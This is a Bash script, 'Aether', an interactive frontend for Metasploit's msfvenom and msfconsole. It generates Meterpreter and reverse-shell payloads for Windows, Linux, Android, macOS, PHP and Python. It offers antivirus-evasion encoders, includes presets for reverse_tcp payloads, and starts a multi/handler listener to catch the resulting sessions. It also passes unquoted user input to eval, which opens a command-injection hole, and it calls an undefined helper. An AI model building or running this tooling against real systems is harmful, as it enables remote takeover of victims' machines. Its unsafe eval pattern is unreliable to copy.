#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                          AETHER - PAYLOAD GENESIS                        ║
# ║                Advanced MSFVENOM Frontend for Kali                       ║
# ║       Developed by: AHMED EMAD AND MOHMED NAGY AND ABDALLAH NEGEADA      ║
# ║                     AND ABDALLAH SALMAN                                  ║
# ╚══════════════════════════════════════════════════════════════════════════╝

set -u
IFS=$'\n\t'

# ─── Colors ───
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'
WHITE='\033[1;37m'; DIM='\033[2m'; NC='\033[0m'; BOLD='\033[1m'

# ─── Configuration ───
APP="Aether"; VERSION="3.5.0"
CONFIG_DIR="$HOME/.aether"; CONFIG_FILE="$CONFIG_DIR/config"
LOG_FILE="$CONFIG_DIR/aether.log"; CACHE_DIR="$CONFIG_DIR/cache"
OUTPUT_DIR="$HOME/aether_payloads"

mkdir -p "$CONFIG_DIR" "$CACHE_DIR" "$OUTPUT_DIR" 2>/dev/null
touch "$LOG_FILE"

DEFAULT_LHOST=""; DEFAULT_LPORT="4444"; DEFAULT_ENCODER="none"
DEFAULT_ITERATIONS=1; DEFAULT_FORMAT="exe"; DEFAULT_PLATFORM="windows"; DEFAULT_ARCH="x64"
[ -f "$CONFIG_FILE" ] && source "$CONFIG_FILE"

# ─── Helpers (all output to stderr except payload name) ───
log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"; }
ok()  { echo -e "${GREEN}[+] $1${NC}" >&2; log "OK: $1"; }
err() { echo -e "${RED}[!] $1${NC}" >&2; log "ERROR: $1"; }
info(){ echo -e "${YELLOW}[*] $1${NC}" >&2; }
title(){ echo -e "${CYAN}${BOLD}── $1 ──${NC}" >&2; }
press_enter() { echo >&2; read -rp "Press Enter to continue..."; }

check_deps() {
    for cmd in msfvenom msfconsole; do
        command -v "$cmd" &>/dev/null || {
            err "Missing $cmd. Install Metasploit."
            exit 1
        }
    done
}

save_config() {
    cat > "$CONFIG_FILE" <<EOF
DEFAULT_LHOST="$DEFAULT_LHOST"
DEFAULT_LPORT="$DEFAULT_LPORT"
DEFAULT_ENCODER="$DEFAULT_ENCODER"
DEFAULT_ITERATIONS=$DEFAULT_ITERATIONS
DEFAULT_FORMAT="$DEFAULT_FORMAT"
DEFAULT_PLATFORM="$DEFAULT_PLATFORM"
DEFAULT_ARCH="$DEFAULT_ARCH"
EOF
}

# ─── Banner with AETHER logo and team box ───
banner() {
    clear
    echo -e "${YELLOW}${BOLD}"
    echo "   █████╗ ███████╗████████╗██╗  ██╗███████╗██████╗ "
    echo "  ██╔══██╗██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗"
    echo "  ███████║█████╗     ██║   ███████║█████╗  ██████╔╝"
    echo "  ██╔══██║██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗"
    echo "  ██║  ██║███████╗   ██║   ██║  ██║███████╗██║  ██║"
    echo "  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "${NC}"
    echo -e "  ${YELLOW}╔═══════════════════════════════════════════╗${NC}"
    echo -e "  ${YELLOW}║${NC}   ${CYAN}Ahmed Emad${NC}         ${GREEN}Mohamed Nagy${NC}         ${YELLOW}║${NC}"
    echo -e "  ${YELLOW}║${NC}   ${CYAN}Abdallah Negeada${NC}   ${GREEN}Abdallah Salman${NC}      ${YELLOW}║${NC}"
    echo -e "  ${YELLOW}╚═══════════════════════════════════════════╝${NC}"
    echo
}

# ─── Main Menu ───
show_main_menu() {
    echo -e "  ${BOLD}${CYAN}── MAIN MENU ──${NC}"
    echo
    echo -e "  ${GREEN}1)${NC} ${BOLD}${WHITE}Generate Payload${NC}"
    echo -e "  ${GREEN}2)${NC} ${BOLD}${WHITE}Quick Presets${NC}"
    echo -e "  ${GREEN}3)${NC} ${BOLD}${WHITE}Start Listener${NC}"
    echo -e "  ${GREEN}4)${NC} ${BOLD}${WHITE}Settings${NC}"
    echo -e "  ${GREEN}5)${NC} ${RED}${BOLD}Exit${NC}"
    echo
}

# ─── Payload Cache ───
update_cache() {
    info "Updating payload cache..."
    msfvenom --list payloads 2>/dev/null | awk 'NR>5 {print $1}' > "$CACHE_DIR/all_payloads.txt"
    ok "Cache updated ($(wc -l < "$CACHE_DIR/all_payloads.txt") payloads)."
}

filter_payloads() {
    local plat="$1" arch="$2" type="$3"
    local cache="$CACHE_DIR/all_payloads.txt"
    if [ ! -s "$cache" ] || [ "$(find "$cache" -mmin +60 2>/dev/null)" ]; then
        update_cache
    fi
    local regex="^${plat}/${arch}/${type}"
    [ "$type" = "any" ] && regex="^${plat}/${arch}/"
    [ "$arch" = "any" ] && regex="^${plat}/"
    [ "$plat" = "any" ] && regex="."
    grep -E "$regex" "$cache" 2>/dev/null
}

select_payload() {
    local plat="$1" arch="$2" type="$3"
    local list tmpfile
    mapfile -t list < <(filter_payloads "$plat" "$arch" "$type")
    if [ ${#list[@]} -eq 0 ]; then
        err "No payloads match criteria."
        return 1
    fi

    tmpfile=$(mktemp)
    for i in "${!list[@]}"; do
        printf "%4d) %s\n" $((i+1)) "${list[$i]}"
    done > "$tmpfile"

    cat "$tmpfile" >&2
    rm -f "$tmpfile"

    echo >&2
    local payload
    if command -v fzf &>/dev/null; then
        payload=$(printf '%s\n' "${list[@]}" | fzf --header="Select payload (type to filter, Enter to confirm)")
        [ -z "$payload" ] && return 1
    else
        local selection
        read -rp "Enter payload number (1-${#list[@]}) or full name: " selection
        if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -le ${#list[@]} ]; then
            payload="${list[$((selection-1))]}"
        elif [ -n "$selection" ]; then
            payload="$selection"
        else
            return 1
        fi
    fi

    echo "$payload"
}

# ─── Generate Payload ───
generate_payload() {
    banner
    title "Payload Generation"

    # Platform
    echo -e "${WHITE}Select target platform:${NC}" >&2
    local platforms=("windows" "linux" "android" "osx" "ios" "php" "python" "generic")
    for i in "${!platforms[@]}"; do
        printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}%s${NC}\n" $((i+1)) "${platforms[$i]}" >&2
    done
    read -rp "Choice (1-${#platforms[@]}, default: $DEFAULT_PLATFORM): " plat_choice
    plat_choice=${plat_choice:-$DEFAULT_PLATFORM}
    if [[ "$plat_choice" =~ ^[0-9]+$ ]] && [ "$plat_choice" -ge 1 ] && [ "$plat_choice" -le ${#platforms[@]} ]; then
        platform_disp="${platforms[$((plat_choice-1))]}"
        case "$platform_disp" in
            osx) platform="osx" ;;
            ios) platform="apple_ios" ;;
            *)   platform="$platform_disp" ;;
        esac
    else
        platform="$plat_choice"
    fi

    # Architecture
    local archs=()
    case "$platform" in
        windows)    archs=("x86" "x64") ;;
        linux)      archs=("x86" "x64" "armle" "mipsle") ;;
        android)    archs=("arm" "arm64" "x86" "x64") ;;
        osx)        archs=("x86" "x64") ;;
        apple_ios)  archs=("arm64") ;;
        php|python) archs=("generic") ;;
        *)          archs=("x86" "x64" "arm") ;;
    esac
    echo -e "\n${WHITE}Select architecture:${NC}" >&2
    for i in "${!archs[@]}"; do
        printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}%s${NC}\n" $((i+1)) "${archs[$i]}" >&2
    done
    printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}custom${NC}\n" $(( ${#archs[@]}+1 )) >&2
    read -rp "Choice (1-$((${#archs[@]}+1)), default: $DEFAULT_ARCH): " arch_choice
    arch_choice=${arch_choice:-$DEFAULT_ARCH}
    if [[ "$arch_choice" =~ ^[0-9]+$ ]] && [ "$arch_choice" -le ${#archs[@]} ]; then
        arch="${archs[$((arch_choice-1))]}"
    elif [ "$arch_choice" -eq $(( ${#archs[@]}+1 )) ]; then
        read -rp "Enter custom architecture: " arch
    else
        arch="$arch_choice"
    fi

    # Payload type
    echo -e "\n${WHITE}Payload type:${NC}" >&2
    printf "  ${GREEN}1)${NC} ${BOLD}${WHITE}meterpreter${NC}\n" >&2
    printf "  ${GREEN}2)${NC} ${BOLD}${WHITE}shell${NC}\n" >&2
    printf "  ${GREEN}3)${NC} ${BOLD}${WHITE}custom (enter substring)${NC}\n" >&2
    printf "  ${GREEN}4)${NC} ${BOLD}${WHITE}any${NC}\n" >&2
    read -rp "Choice [4]: " type_choice
    type_choice=${type_choice:-4}
    local ptype="any"
    case "$type_choice" in
        1) ptype="meterpreter";;
        2) ptype="shell";;
        3) read -rp "Enter substring: " ptype;;
        4) ptype="any";;
        *) err "Invalid"; sleep 1; return;;
    esac

    info "Loading payload list..."
    local payload
    payload=$(select_payload "$platform" "$arch" "$ptype")
    if [ -z "$payload" ]; then
        err "No payload chosen."; return
    fi
    echo -e "${GREEN}Selected payload: $payload${NC}" >&2

    # LHOST/LPORT
    read -rp "LHOST [$DEFAULT_LHOST]: " lhost
    lhost=${lhost:-$DEFAULT_LHOST}
    read -rp "LPORT [$DEFAULT_LPORT]: " lport
    lport=${lport:-$DEFAULT_LPORT}

    # Output format
    echo -e "\n${WHITE}Output format:${NC}" >&2
    local formats=("exe" "elf" "raw" "python" "ps1" "c" "csharp" "dll" "asp" "aspx" "java" "jsp" "war" "bash" "php")
    for i in "${!formats[@]}"; do
        printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}%s${NC}\n" $((i+1)) "${formats[$i]}" >&2
    done
    printf "  ${GREEN}%2d)${NC} ${BOLD}${WHITE}custom${NC}\n" $(( ${#formats[@]}+1 )) >&2
    read -rp "Choice (1-$((${#formats[@]}+1)), default: $DEFAULT_FORMAT): " fmt_choice
    fmt_choice=${fmt_choice:-$DEFAULT_FORMAT}
    if [[ "$fmt_choice" =~ ^[0-9]+$ ]]; then
        if [ "$fmt_choice" -le "${#formats[@]}" ]; then
            format="${formats[$((fmt_choice-1))]}"
        elif [ "$fmt_choice" -eq $(( ${#formats[@]}+1 )) ]; then
            read -rp "Enter custom format: " format
        else
            format="$fmt_choice"
        fi
    else
        format="$fmt_choice"
    fi

    read -rp "Output filename (without extension): " out_name
    out_path="$OUTPUT_DIR/${out_name}.${format}"

    # Encoder
    echo -e "\n${WHITE}Encoder (optional):${NC}" >&2
    printf "  ${GREEN}0)${NC} ${BOLD}${WHITE}None${NC}\n" >&2
    printf "  ${GREEN}1)${NC} ${BOLD}${WHITE}x86/shikata_ga_nai${NC}\n" >&2
    printf "  ${GREEN}2)${NC} ${BOLD}${WHITE}x64/xor${NC}\n" >&2
    printf "  ${GREEN}3)${NC} ${BOLD}${WHITE}x86/xor_dynamic${NC}\n" >&2
    printf "  ${GREEN}4)${NC} ${BOLD}${WHITE}cmd/powershell_base64${NC}\n" >&2
    printf "  ${GREEN}5)${NC} ${BOLD}${WHITE}generic/none${NC}\n" >&2
    printf "  ${GREEN}6)${NC} ${BOLD}${WHITE}custom${NC}\n" >&2
    read -rp "Choice [$DEFAULT_ENCODER]: " enc_choice
    enc_choice=${enc_choice:-$DEFAULT_ENCODER}
    local encoder=""; local enc_iterations=0
    case "$enc_choice" in
        0) ;;
        1) encoder="x86/shikata_ga_nai"; read -rp "Iterations [$DEFAULT_ITERATIONS]: " enc_iterations; enc_iterations=${enc_iterations:-$DEFAULT_ITERATIONS};;
        2) encoder="x64/xor"; read -rp "Iterations [1]: " enc_iterations; enc_iterations=${enc_iterations:-1};;
        3) encoder="x86/xor_dynamic"; read -rp "Iterations [1]: " enc_iterations; enc_iterations=${enc_iterations:-1};;
        4) encoder="cmd/powershell_base64";;
        5) encoder="generic/none";;
        6) read -rp "Encoder: " encoder; read -rp "Iterations [1]: " enc_iterations; enc_iterations=${enc_iterations:-1};;
        *) err "Invalid"; sleep 1; return;;
    esac

    # Command preview
    local cmd_args=()
    cmd_args+=("msfvenom")
    cmd_args+=("-p" "$payload")
    cmd_args+=("LHOST=$lhost" "LPORT=$lport")
    [ -n "$encoder" ] && cmd_args+=("-e" "$encoder" "-i" "$enc_iterations")
    cmd_args+=("-f" "$format" "-o" "$out_path")

    echo -e "\n${YELLOW}Command preview:${NC}" >&2
    for arg in "${cmd_args[@]}"; do
        printf "  %s\n" "$arg" >&2
    done

    local exec_cmd="msfvenom -p $payload LHOST=$lhost LPORT=$lport"
    [ -n "$encoder" ] && exec_cmd+=" -e $encoder -i $enc_iterations"
    exec_cmd+=" -f $format -o $out_path"

    read -rp "Proceed? (y/n): " confirm
    [ "$confirm" != "y" ] && return

    eval "$exec_cmd"
    if [ $? -eq 0 ]; then
        ok "Payload created: $out_path"
        DEFAULT_LHOST="$lhost"; DEFAULT_LPORT="$lport"; DEFAULT_ENCODER="$enc_choice"
        DEFAULT_ITERATIONS="$enc_iterations"; DEFAULT_FORMAT="$format"
        DEFAULT_PLATFORM="$platform_disp"; DEFAULT_ARCH="$arch"
        save_config
    else
        err "msfvenom failed."
    fi
    press_enter
}

# ─── Quick Presets ───
quick_presets() {
    banner
    title "Quick Presets"
    printf "  ${GREEN}1)${NC} ${BOLD}${WHITE}Windows x64 Meterpreter TCP (exe)${NC}\n" >&2
    printf "  ${GREEN}2)${NC} ${BOLD}${WHITE}Windows x64 Shell TCP (exe)${NC}\n" >&2
    printf "  ${GREEN}3)${NC} ${BOLD}${WHITE}Linux x64 Meterpreter TCP (elf)${NC}\n" >&2
    printf "  ${GREEN}4)${NC} ${BOLD}${WHITE}Linux x86 Shell TCP (elf)${NC}\n" >&2
    printf "  ${GREEN}5)${NC} ${BOLD}${WHITE}Android Meterpreter TCP (raw)${NC}\n" >&2
    printf "  ${GREEN}6)${NC} ${BOLD}${WHITE}macOS x64 Meterpreter TCP (macho)${NC}\n" >&2
    printf "  ${GREEN}7)${NC} ${BOLD}${WHITE}PHP Meterpreter TCP (raw)${NC}\n" >&2
    printf "  ${GREEN}8)${NC} ${BOLD}${WHITE}Python Reverse Shell (raw)${NC}\n" >&2
    printf "  ${GREEN}0)${NC} ${BOLD}${WHITE}Back${NC}\n" >&2
    read -rp "Choice: " qc
    case $qc in
        1) payload="windows/x64/meterpreter/reverse_tcp"; format="exe";;
        2) payload="windows/x64/shell/reverse_tcp"; format="exe";;
        3) payload="linux/x64/meterpreter/reverse_tcp"; format="elf";;
        4) payload="linux/x86/shell_reverse_tcp"; format="elf";;
        5) payload="android/meterpreter/reverse_tcp"; format="raw";;
        6) payload="osx/x64/meterpreter/reverse_tcp"; format="macho";;
        7) payload="php/meterpreter/reverse_tcp"; format="raw";;
        8) payload="python/shell_reverse_tcp"; format="raw";;
        0) return;;
        *) err "Invalid"; sleep 1; return;;
    esac
    read -rp "LHOST [$DEFAULT_LHOST]: " lhost; lhost=${lhost:-$DEFAULT_LHOST}
    read -rp "LPORT [$DEFAULT_LPORT]: " lport; lport=${lport:-$DEFAULT_LPORT}
    read -rp "Output filename (without extension): " out_name
    out_path="$OUTPUT_DIR/${out_name}.${format}"
    local cmd="msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -o $out_path"
    echo -e "${DIM}Command: $cmd${NC}" >&2
    read -rp "Proceed? (y/n): " confirm
    [ "$confirm" != "y" ] && return
    eval "$cmd" && ok "Created $out_path" || err "Failed."
    press_enter
}

# ─── Listener ───
start_listener() {
    banner
    title "Start Listener"
    echo -e "${WHITE}Select payload platform:${NC}" >&2
    local platforms=("windows" "linux" "android" "osx" "generic")
    select plat in "${platforms[@]}" "custom"; do
        platform=$plat
        [ "$platform" = "custom" ] && read -rp "Platform: " platform
        break
    done
    read -rp "Architecture [$DEFAULT_ARCH]: " arch; arch=${arch:-$DEFAULT_ARCH}
    local payload
    payload=$(select_payload "$platform" "$arch" "any")
    [ -z "$payload" ] && return
    read -rp "LHOST [$DEFAULT_LHOST]: " lhost; lhost=${lhost:-$DEFAULT_LHOST}
    read -rp "LPORT [$DEFAULT_LPORT]: " lport; lport=${lport:-$DEFAULT_LPORT}
    rcfile="$CONFIG_DIR/listener.rc"
    cat > "$rcfile" <<EOF
use multi/handler
set payload $payload
set LHOST $lhost
set LPORT $lport
set ExitOnSession false
exploit -j
EOF
    echo -e "${GREEN}Launching msfconsole...${NC}" >&2
    if command -v xterm &>/dev/null; then
        xterm -e "msfconsole -q -r $rcfile" &
    elif command -v gnome-terminal &>/dev/null; then
        gnome-terminal -- bash -c "msfconsole -q -r $rcfile; exec bash" &
    else
        msfconsole -q -r "$rcfile"
    fi
    ok "Listener started."
    log "Listener for $payload on $lhost:$lport"
    press_enter
}

# ─── Settings ───
settings_menu() {
    banner
    title "Settings"
    printf "  ${GREEN}1)${NC} ${BOLD}${WHITE}LHOST:${NC} $DEFAULT_LHOST\n" >&2
    printf "  ${GREEN}2)${NC} ${BOLD}${WHITE}LPORT:${NC} $DEFAULT_LPORT\n" >&2
    printf "  ${GREEN}3)${NC} ${BOLD}${WHITE}Encoder:${NC} $DEFAULT_ENCODER\n" >&2
    printf "  ${GREEN}4)${NC} ${BOLD}${WHITE}Iterations:${NC} $DEFAULT_ITERATIONS\n" >&2
    printf "  ${GREEN}5)${NC} ${BOLD}${WHITE}Format:${NC} $DEFAULT_FORMAT\n" >&2
    printf "  ${GREEN}6)${NC} ${BOLD}${WHITE}Platform:${NC} $DEFAULT_PLATFORM\n" >&2
    printf "  ${GREEN}7)${NC} ${BOLD}${WHITE}Architecture:${NC} $DEFAULT_ARCH\n" >&2
    printf "  ${GREEN}8)${NC} ${BOLD}${WHITE}Output dir:${NC} $OUTPUT_DIR\n" >&2
    printf "  ${GREEN}9)${NC} ${BOLD}${WHITE}View log${NC}\n" >&2
    printf "  ${GREEN}0)${NC} ${BOLD}${WHITE}Back${NC}\n" >&2
    read -rp "Choice: " sc
    case $sc in
        1) read -rp "New LHOST: " DEFAULT_LHOST; save_config; ok "Saved.";;
        2) read -rp "New LPORT: " DEFAULT_LPORT; save_config; ok "Saved.";;
        3) read -rp "Encoder: " DEFAULT_ENCODER; save_config; ok "Saved.";;
        4) read -rp "Iterations: " DEFAULT_ITERATIONS; save_config; ok "Saved.";;
        5) read -rp "Format: " DEFAULT_FORMAT; save_config; ok "Saved.";;
        6) read -rp "Platform: " DEFAULT_PLATFORM; save_config; ok "Saved.";;
        7) read -rp "Arch: " DEFAULT_ARCH; save_config; ok "Saved.";;
        8) read -rp "New directory: " nd; mkdir -p "$nd" && { OUTPUT_DIR="$nd"; save_config; ok "Updated."; } || err "Cannot create.";;
        9) less "$LOG_FILE" 2>/dev/null || warn "No log."; press_enter;;
    esac
    press_enter
}

# ─── Main ───
main() {
    check_deps
    [ -s "$CACHE_DIR/all_payloads.txt" ] || update_cache
    while true; do
        banner
        show_main_menu
        read -rp $'\033[0;32m❯ \033[0m' choice
        case $choice in
            1) generate_payload;;
            2) quick_presets;;
            3) start_listener;;
            4) settings_menu;;
            5) echo -e "\n${MAGENTA}Aether closed.${NC}" >&2; exit 0;;
            *) err "Invalid option."; sleep 1;;
        esac
    done
}

main "$@"
